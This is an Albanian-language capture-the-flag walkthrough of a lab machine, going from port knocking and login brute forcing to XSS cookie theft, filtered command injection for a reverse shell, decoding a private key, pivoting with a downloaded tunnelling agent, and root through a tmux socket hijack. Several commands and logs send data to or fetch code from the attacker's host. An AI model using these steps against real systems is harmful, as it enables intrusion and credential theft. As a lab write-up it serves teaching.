# MisguidedGhosts

Skanojme IP me nmap. Portat 21 dhe 22 tcp jane hapur.
```
nmap -sCV 10.10.132.38
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 22:14 CEST
Nmap scan report for 10.10.132.38
Host is up (0.085s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.75.118
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:91:89:96:af:bc:06:b9:8d:43:df:53:dc:1f:8f:12 (RSA)
|   256 25:0b:be:a2:f9:64:3e:f1:e3:15:e8:23:b8:8c:e5:16 (ECDSA)
|_  256 09:59:9a:84:e6:6f:01:f3:33:8e:48:44:52:49:14:db (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
                                                                                                                     
```
FTP lejon logimin si anonim dhe brenda ndodhen disa file interesante.
```
ftp 10.10.132.38            
Connected to 10.10.132.38.
220 (vsFTPd 3.0.3)
Name (10.10.132.38:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||10568|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 28  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> dir
229 Entering Extended Passive Mode (|||65006|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           103 Aug 28  2020 info.txt
-rw-r--r--    1 ftp      ftp           248 Aug 26  2020 jokes.txt
-rw-r--r--    1 ftp      ftp        737512 Aug 18  2020 trace.pcapng
226 Directory send OK.
```
Nga hintet qe ndodhen brenda fileve kuptojme qe duhet perdorur knock. Perdorim knock per te evituar masen e sigurise port knocking. Portat i gjejme ne pcap me wireshark.
```
cat jokes.txt     
Taylor: Knock, knock.
Josh:   Who's there?
Taylor: The interrupting cow.
Josh:   The interrupting cow--
Taylor: Moo

Josh:   Knock, knock.
Taylor: Who's there?
Josh:   Adore.
Taylor: Adore who?
Josh:   Adore is between you and I so please open up!
```

![Wireshark_1](https://github.com/zagnox/MisguidedGhosts/assets/144890045/66c6d0f3-5292-4be8-809d-ddfd9d951e7a)

```
knock 10.10.132.38 7864 8273 9241 12007 60753
```
Pasi kryejme port knocking dhe skanojme serish shohim qe porta 8080 eshte hapur dhe sherbimi.
```
8080/tcp open  ssl/http Werkzeug httpd 1.0.1 (Python 2.7.18)
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
|_ssl-date: TLS randomness does not represent time
|_http-title: Misguided Ghosts
| ssl-cert: Subject: commonName=misguided_ghosts.thm/organizationName=Misguided Ghosts/stateOrProvinceName=Williamson Country/countryName=TN
| Not valid before: 2020-08-11T16:52:11
|_Not valid after:  2021-08-11T16:52:11
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
Ne browser shohim nje website minimalist. Perdorim gobuster per te kryer directory brute forcing.
![webapp](https://github.com/zagnox/MisguidedGhosts/assets/144890045/3f587f78-376f-4482-a839-6bfbe5f2956c)

```
gobuster dir -u https://10.10.132.38:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.132.38:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login
```
Sqlmap tregon qe nuk ka mundesi per sql injection prandaj mbetet te tentojme brute forcing. krijojme nje wordlist me username potencial dhe provojme teknika te ndryshme me burp intruder. Duke perdorur intruderin me battering ram attack gjejme kredencialet zac:zac
```
cat users.txt
admin
administrator
josh
taylor
adore
zac
```
![intruder](https://github.com/zagnox/MisguidedGhosts/assets/144890045/c9ca1530-064a-4d4f-bb5e-4ed60fa8a828)

Logohemi me kredencialet e gjetura dhe hyjme ne dashboard ku mund te krijojme postime

![webapp_dashboard](https://github.com/zagnox/MisguidedGhosts/assets/144890045/c3c131f6-e3a1-494e-b2b8-5581ba297d34)

Tentojme XSS dhe SSTI me burp intruder per te gjetur vulnerabilitete. Me burpsuite arrijme te dallojme nje xss qe eshte patchuar. Tentojme te shmangim filtrat dhe arrijme te gjejme nje payload qe funksionon.

![burp_bugXSS](https://github.com/zagnox/MisguidedGhosts/assets/144890045/74dd6b91-2b6c-4721-b132-b641c145e8dd)

![xss_Pwn3d](https://github.com/zagnox/MisguidedGhosts/assets/144890045/78053456-037c-47d7-955a-ba5e3218980d)

10. Duke qene se webi eshte vulnerabel ndaj XSS hapi i rradhes eshte te kapim cookien e adminit dhe ta dergojme me nje request drejt IP tone.

```
python -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
10.14.75.118 - - [16/Apr/2024 23:55:32] code 404, message File not found
10.14.75.118 - - [16/Apr/2024 23:55:32] "GET /XSS/grabber.php?c=login=zac_from_paramore HTTP/1.1" 404 -
10.10.132.38 - - [16/Apr/2024 23:55:56] code 404, message File not found
10.10.132.38 - - [16/Apr/2024 23:55:56] "GET /XSS/grabber.php?c=login=hayley_is_admin HTTP/1.1" 404 -
```
![hayley_login](https://github.com/zagnox/MisguidedGhosts/assets/144890045/1bcda59c-1eb7-44ee-bb6b-a121308d15a2)

Me cookien qe kapem mund te logohemi dhe kryejme directory brute forcing dhe zbulojme /photos. Kur ngarkojme dicka shohim qe ne url kemi nje parameter te quajtur image. Duke tentuar per directory traversal dhe command injection dallojme disa komanda te suksesshme.
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.132.38:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] Cookies:                 login=hayley_is_admin
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/photos
```

![command_injection](https://github.com/zagnox/MisguidedGhosts/assets/144890045/0774ed2c-e207-4fbb-9fd8-491d10564736)

Kur tentojme te marrim nje reverse shell me command injection shohim qe hapesirat filtrohen. Per te shmangur hapesirat perdorim ${IFS}
![no_space_cmd_injection](https://github.com/zagnox/MisguidedGhosts/assets/144890045/acc8304a-9cbd-42cd-9fd9-c595c8fee6bf)

```

```
Pasi morem shellin gjetem disa file me instruksion dhe nje rsa key te koduar me cipher ne direkotrine e Zac.
```
sudo rlwrap nc -lnvp 443           
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.14.75.118] from (UNKNOWN) [10.10.206.148] 39519
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
whoami
root
cd zac
ls -la
total 12
drwxr-xr-x    3 root     root          4096 Apr 17 18:10 .
drwxr-xr-x    1 root     root          4096 Apr 17 18:10 ..
drwxrwxr-x    2 1001     1001          4096 Aug 26  2020 notes
cd notes
ls -la
total 16
drwxrwxr-x    2 1001     1001          4096 Aug 26  2020 .
drwxr-xr-x    3 root     root          4096 Apr 17 18:10 ..
-rw-r--r--    1 1001     1002          1675 Aug 25  2020 .id_rsa
-rw-r--r--    1 1001     1002           270 Aug 25  2020 .secret
cat .id_rsa
-----BEGIN RSA PRIVATE KEY-----
NCBXsnNMYBEVTUVFawb9f8f0vbwLpvf0hfa1PYy0C91sYIG/U5Ss15fDbm2HmHdS
CgGHOkqGhIucEqe4mrcwZRY3ooKX2uB8IxJ6Ke9wM6g8jOayHFw2/UPWnveLxUQq
0Z/g9X5zJjaHfPI62OKyOFPEx7Mm0mfB5yRIzdi0NEaMmxR6cFGZuBaTOgMWRIk6
aJSO7oocDBsVbpuDED7SzviXvqTHYk/ToE9Rg/kV2sIpt7Q0D0lZNhz7zTo79IP0
TwAa61/L7ctOVRwU8nmYFoc45M0kgs5az0liJloOopJ5N3iFPHScyG0lgJYOmeiW
QQ8XJJqqB6LwRVE7hgGW7hvNM5TJh4Ee6M3wKRCWTURGLmJVTXu1vmLXz1gOrxKG
a60TrsfLpVu6zfWEtNGEwC4Q4rov7IZjeUCQK9p+4Gaegchy1m5RIuS3na45BkZL
4kv5qHsUU17xfAbpec90T66Iq8sSM0Je8SiivQFyltwc07t99BrVLe9xLjaETX/o
DIk3GCMBNDui5YhP0E66zyovPfeWLweUWZTYJpRsyPoavtSXMqKJ3M4uK00omAEY
cXcpQ+UtMusDiU6CvBfNFdlgq8Rmu0IU9Uvu+jBBEgxHovMr+0MNMcrnYmGtTVHe
gYUVd7lraZupxArh1WHS8llbj9jgQ5LhyAiGrx6vUukyFZ8IDTjA5BmmoBHPvmbj
mwRx+RJNeZYT3Pl/1Qe8Uc4IAim3Y7yzMMfoZodw/g2G2qx4sNjYLJ8Mry6RJ8Fq
wf2ES1WOyNOHjQ2iZ1JrXfJnEc/hU1J3ZLhY7p6oO+DAd7m5HomDik/vUTXlS3u1
A1Pr4XRZW0RYggysRmUTqVEiuTIMY4Y0LhIbY/Vo8pg6OTyKL0+ktaCDaRXEnZBp
VU1ABBWoGPfXgUpEOsvgafreUVHnyeYru8n4L8WB/V7xUk56mcU6pobmD3g19T6n
ddocO8sVX6W8mhPVllsc6l+Xl4enJUmReXmXaiPiHoch1oaCgrYYmsONThM7QUut
oOIGdb6O/3qfZA+V+EIm3tP+3U/+RsurKmrpVIFWzRIRuj90aBhOzNBsAHloOlOB
LCuVjI5M6VuXJ+YY9M9biS2qafFUgIUaKYMVdzDtJFkMhACpJqpy+w6owW0hn3vA
H6gpsbnl3zm3ey0JMqnDbwWqKFWTU6DK8V5o6whXZJRXJb1Lxs38PiAry9TPRGVA
M5EY0XxjniM5EY0XxjniM5EY0XxjniOoesweDGHryeJNeZV9iRP/CAV0LGDx7FAtl3a7p3DGb2qz0FL6Dyys
vgh73EndW0xa6N8clLyA1/GR5x54h+ayGzMQa8d4ZdAhWl+CZMpTjqEEYKRL9/Xc
eXU3MNVuPeDrqdjYGg+4xXtSaLwSbOmGwH/aED2j4xxgraMo3Bp+raHGmOEex/RL
1nCbZKDUkUP3Cv8mc9AAVs8UN6O6/nZo1pISgJyPjuUyz7S/paSz04x7DjY80Ema
r8WpMKfgl3+jWta+es1oL6DtD9y7RD5u9RPSXGNt/3QwNu+xNlle39laa8UZayPI
VhBUH4wvFSmt0puRjBgE6Y5smOxoId18IFKZL1mko1Y68nLNMJsj
-----END RSA PRIVATE KEY-----
cat .secret
Zac,

I know you can never remember your password, so I left your private key here so you don't have to use a password. I ciphered it in case we suffer another hack, but I know you remember how to get the key to the cipher if you can't remember that either.

- Paramore
```

Celesi rsa per ssh eshte i koduar me cipher. Pas nje kerkimi ne google kuptojme qe celesat RSA fillojne ne shumicen e rasteve me 3 karakteret 'MII'. Duke ditur kete informacion ne mund te tentojme te bejme brute force nga cyberchef deri sa te gjejme shkronjat e cipherit qe perputhet me karakteret e celesit tone.

![cipher_decode](https://github.com/zagnox/MisguidedGhosts/assets/144890045/b88ff41b-d60f-48f4-a46c-fdb89bd5340e)

Tani qe kemi cipherin mund ta dekodojme te gjithe celesin rsa dhe ta perodrim per tu loguar me ssh

![full_decode_key](https://github.com/zagnox/MisguidedGhosts/assets/144890045/8704ae73-0877-4100-998a-1b95bce80771)


Tani qe kemi dekoduar celesin ne mund te hyjme me ssh si zac. 
```
chmod 600 id_rsa_decoded
                                                                                                                     
┌──(kali㉿kali)-[~/THM-Project/loot]
└─$ ssh -i id_rsa_decoded zac@10.10.165.216
The authenticity of host '10.10.165.216 (10.10.165.216)' can't be established.
ED25519 key fingerprint is SHA256:tPogRfFyMYRZISVMCfez4OumDiEypjGHoQV9m7KRcII.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.165.216' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr 17 18:54:19 UTC 2024

  System load:  0.08               Processes:              208
  Usage of /:   50.9% of 18.57GB   Users logged in:        1
  Memory usage: 46%                IP address for eth0:    10.10.165.216
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

8 packages can be updated.
0 updates are security updates.


Last login: Wed Aug 26 14:27:15 2020 from 192.168.236.128
zac@misguided_ghosts:~$ whoami
zac
```
Hapi tjeter eshte te eskalojme privilegjet ne root Pasi kryejme kerkim automartik me linpeas shohim qe portat 22 139 dhe 445 ne localhost jane hapur dhe smb lejon logim si anonim. Perodrim ligolo-ng per te bere forward gjithe portat lokale drejt hostit tone.
```
wget 10.14.75.118:8000/agent
--2024-04-17 18:59:13--  http://10.14.75.118:8000/agent
Connecting to 10.14.75.118:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4681728 (4.5M) [application/octet-stream]
Saving to: ‘agent’

zac@misguided_ghosts:/tmp$ chmod +x agent
zac@misguided_ghosts:/tmp$ ./agent -connect 10.14.75.118:1337
INFO[0000] Connection established                        addr="10.14.75.118:1337"
2024/04/17 19:01:09 [ERR] yamux: Failed to read header: tls: failed to verify certificate: x509: cannot validate certif
icate for 10.14.75.118 because it doesn't contain any IP SANs
ERRO[0000] Connection error: tls: failed to verify certificate: x509: cannot validate certificate for 10.14.75.118 beca
use it doesn't contain any IP SANs 
FATA[0000] tls: failed to verify certificate: x509: cannot validate certificate for 10.14.75.118 because it doesn't con
tain any IP SANs 
zac@misguided_ghosts:/tmp$ ./agent -connect 10.14.75.118:1337 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.14.75.118:1337"
```
Tani kemi akses ne te gjitha portat e localhostit te viktimes. Nga hosti jone mund te shohim se cfare ka ne smb.
```
crackmapexec smb 240.0.0.1 -u anonymous -p "" --shares
SMB         240.0.0.1       445    MISGUIDED_GHOSTS [*] Windows 6.1 (name:MISGUIDED_GHOSTS) (domain:) (signing:False) (SMBv1:True)
SMB         240.0.0.1       445    MISGUIDED_GHOSTS [+] \anonymous: 
SMB         240.0.0.1       445    MISGUIDED_GHOSTS [+] Enumerated shares
SMB         240.0.0.1       445    MISGUIDED_GHOSTS Share           Permissions     Remark
SMB         240.0.0.1       445    MISGUIDED_GHOSTS -----           -----------     ------
SMB         240.0.0.1       445    MISGUIDED_GHOSTS print$                          Printer Drivers
SMB         240.0.0.1       445    MISGUIDED_GHOSTS local           READ            Local list of passwords for our services
SMB         240.0.0.1       445    MISGUIDED_GHOSTS IPC$                            IPC Service (misguided_ghosts server (Samba, Ubuntu))
                                                                                                                                                                                                                                             
smbclient -N \\\\240.0.0.1\\local  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Aug 26 16:31:28 2020
  ..                                  D        0  Tue Aug 25 02:00:53 2020
  passwords.bak                       N      160  Wed Aug 26 16:31:28 2020

		19475088 blocks of size 1024. 8545140 blocks available
smb: \> get passwords.bak
getting file \passwords.bak of size 160 as passwords.bak (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> exit
```

Ne smb gjejme nje file me passworde te cilin e perodrim per te bere brute force me ssh userit hayley. Pasi gjejme passwordin logohemi me ssh.

```
cat passwords.bak 
pft7vPl
HQ@5Y64
Ls7kZxv
KPBRFJz
fKtBSbx
FWbnrxr
Kz#SPqn
c4CTRWm
5asYk73
WikHqvi
aBc123!
JPXxIMs
AHwbOmm
tXWsJ3J
QJPQWW0
3bmBhNv
xV!sce1
1bJP1af
DLH4cgw
bRBdPRk
```
```
hydra -l hayley -P passwords.bak ssh://240.0.0.1
```
```
ssh hayley@240.0.0.1             
The authenticity of host '240.0.0.1 (240.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:tPogRfFyMYRZISVMCfez4OumDiEypjGHoQV9m7KRcII.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '240.0.0.1' (ED25519) to the list of known hosts.
hayley@240.0.0.1's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr 17 19:07:12 UTC 2024

  System load:  0.0                Processes:              281
  Usage of /:   51.1% of 18.57GB   Users logged in:        2
  Memory usage: 68%                IP address for eth0:    10.10.165.216
  Swap usage:   0%                 IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

8 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Aug 26 14:30:52 2020 from 192.168.236.128
hayley@misguided_ghosts:~$ whoami
hayley
hayley@misguided_ghosts:~$
```
Serish duke perdorur linpeas shohim se nje session i tmux mund te behet hijack si root. Shkruajme komanden dhe kemi nje tmux session si root.
```
./linpeas.sh

root       859  0.0  0.1  28540  3552 ?        Ss   19:09   0:00 /usr/bin/tmux -S /opt/.details new -s vpn -d

```
Komanda per te bere hijack
```
tmux -S /opt/.details
```

Dhe jemi root

![rooted](https://github.com/zagnox/MisguidedGhosts/assets/144890045/1165159a-25a1-4bd9-bb46-2edbed471cbb)

![tenor-2056549936](https://github.com/zagnox/MisguidedGhosts/assets/144890045/a077e03e-78b4-4bd5-bb46-44a2c1372a37)
